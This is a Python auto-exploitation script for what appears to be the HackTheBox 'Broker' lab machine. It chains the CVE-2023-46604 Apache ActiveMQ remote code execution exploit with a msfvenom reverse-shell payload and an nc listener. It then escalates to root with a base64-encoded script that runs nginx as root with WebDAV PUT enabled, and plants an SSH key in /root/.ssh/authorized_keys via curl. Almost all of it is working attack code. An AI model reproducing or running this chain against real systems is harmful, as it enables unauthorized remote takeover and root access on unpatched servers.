
import sys
import time as cm
import subprocess
import paramiko
import paramiko.ssh_exception
from pwn import *
import requests
import re
import socket
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)

def banner():
    bnn = """
                                                  ______
                                               .-"      "-.       ▓█████ ▄████▄   ██░ ██  ██ ▄█▀    
                                              /            /      ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒            
                                             |              |     ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░        
                                             |,  .-.  .-.  ,|     ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ 
                                             | )(_o/  \o_)( |     ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄
                                             |/     /\     \|     ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒  
                                   (@_       (_     ^^     _)      ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░
                              _     ) \_______\__|IIIIII|__/_____  ░  ░         ░  ░░ ░░ ░░ ░ 
                             (_)@8@8{}<________|-\IIIIII/-|___________________________>
                                    )_/        \          /
                                   (@           `--------`
    """
    print(Fore.RED + f"{bnn}")

global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.243"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t\t[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Exploit] > " + Fore.YELLOW + f"Apache ActiveMQ 5.15.15v")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Broker Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")


def register_user_and_exploti_www():
    try:
        commands_send("git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ &>/dev/null")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.LIGHTCYAN_EX + f"Successly Clone Resposity :3")
        cm.sleep(2)
        commands_send("cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ")
        #print(commands_send("cat CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/poc-linux.xml"))
        cm.sleep(1)
        commands_send(f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={machine_ip} LPORT=9001 -f elf -o test.elf")
        commands_send(f"mv test.elf CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.LIGHTCYAN_EX + f"Successly Revershell.elf Created:3")
        commands_send(f"cat CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/poc-linux.xml | sed 's/0.0.0.0/{machine_ip}/' > poc-linux.xml")
        commands_send(f"mv poc-linux.xml CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.LIGHTCYAN_EX + f"Successly poc-linux.xml Modified:3")
        commands_send(f'cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ && go build -ldflags "-s -w" .')
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.LIGHTCYAN_EX + f"Exec in other term in same path > "  + Fore.LIGHTWHITE_EX + "python3 -m http.server 8001")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.LIGHTCYAN_EX + f"Exec in other term > "  + Fore.LIGHTWHITE_EX + "nc -nlvp 9001")
        input(f"\t\t\t\t\t[Exploit RCE - Call] > " + Fore.GREEN + f"Press enter if you listen server on port 8001 :)")
        command = f'cd "CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ" && ./ActiveMQ-RCE -i {target_machine} -u "http://{machine_ip}:8001/poc-linux.xml"'
        commands_send(command)
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.GREEN + f"CVE-2023-46604-RCE Successly :3")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [activemq-Default] {e}")


def root_exploit_connecting():
    try:
        register_user_and_exploti_www()
        commands_send(""" echo "IyEvYmluL2Jhc2gKI0F1dGhvcjogTDQ0eAoKY2QgL3RtcApjcCAvZXRjL25naW54L25naW54LmNv
bmYgL3RtcAoKZWNobyAiICAgICAgICAgICAgICAgICAgICAgICAgICAgCnVzZXIgcm9vdDsKCmV2
ZW50cyB7CiAgICAgICAgd29ya2VyX2Nvbm5lY3Rpb25zIDc2ODsKICAgICAgICAjIG11bHRpX2Fj
Y2VwdCBvbjsKfQoKaHR0cCB7CiAgICAgICAgc2VydmVyIHsKICAgICAgICAgICAgICAgIGxpc3Rl
biAgICAgOTAwMTsKICAgICAgICAgICAgICAgIHJvb3QgLzsKICAgICAgICAgICAgICAgIGF1dG9p
bmRleCBvbjsKICAgICAgICAgICAgICAgIGRhdl9tZXRob2RzIFBVVDsKICAgICAgICB9Cn0iID4g
bmdpbnguY29uZgoKc3VkbyBuZ2lueCAtYyAvdG1wL25naW54LmNvbmYK" | base64 -d > nginx.sh
                      """)
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit Root - Message] > " + Fore.LIGHTCYAN_EX + f"Use " + Fore.WHITE + "nginx.sh" + Fore.LIGHTCYAN_EX +  " in victim machine :3")
        input(f"\t\t\t\t\t[Exploit RCE - Call] > " + Fore.GREEN + f"Press enter if you success nginx.sh :)")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit Root - Message] > " + Fore.LIGHTCYAN_EX + f"Gen id_rsa in other term > "  + Fore.LIGHTWHITE_EX + "ssh-keygen")
        input(f"\t\t\t\t\t[Exploit RCE - Call] > " + Fore.GREEN + f"Press enter if you generate id_rsa:)")
        id_rsa=commands_send("cat /root/.ssh/id_rsa.pub")
        #print(id_rsa)
        commands_send(f"curl -s -X PUT http://{target_machine}:9001/root/.ssh/authorized_keys -d '{id_rsa}'")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit Root - Message] > " + Fore.LIGHTCYAN_EX + f"Connect to root :# > "  + Fore.LIGHTWHITE_EX + f"ssh root@{target_machine}")
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit Root - Message] > " + Fore.LIGHTCYAN_EX + f"G00dH4cK!!! >3")
        
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [root-user] {e}")

def unlocked():
    try:
        checker_status()
        user_default_hackthebox()
        #Menu0ptions
        while True:
            users=["activemq", "root", "exit"]
            print("----------------------------------------------------")
            print(Fore.MAGENTA + f"\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t~ What ur user select? > "))
            print("----------------------------------------------------\n")
            
            if user_call == 1:
                print("----------------------------------------------------")
                print(Fore.CYAN + f"\t\t ~ [Connection to activemq :)]\n")
                print(Fore.BLUE + f"\t\t\t\t\t[Exploit - Waiting connection to activemq]")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.MAGENTA + f"CVE-2023-46604")
                cm.sleep(.5)
                register_user_and_exploti_www()
                cm.sleep(1)
                print("----------------------------------------------------\n")
                continue
            elif user_call == 2:
                print("----------------------------------------------------")
                print(Fore.CYAN + f"\t\t ~ [Connection to Root :)]\n")
                print(Fore.BLUE + f"\t\t\t\t\t[Exploit - Waiting connection to Root]")
                cm.sleep(.5)
                root_exploit_connecting()
                cm.sleep(1)
                print("----------------------------------------------------\n")
            elif user_call == 3:
                break
            else:
                break
            
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
if __name__ == '__main__':
    banner()
    unlocked()
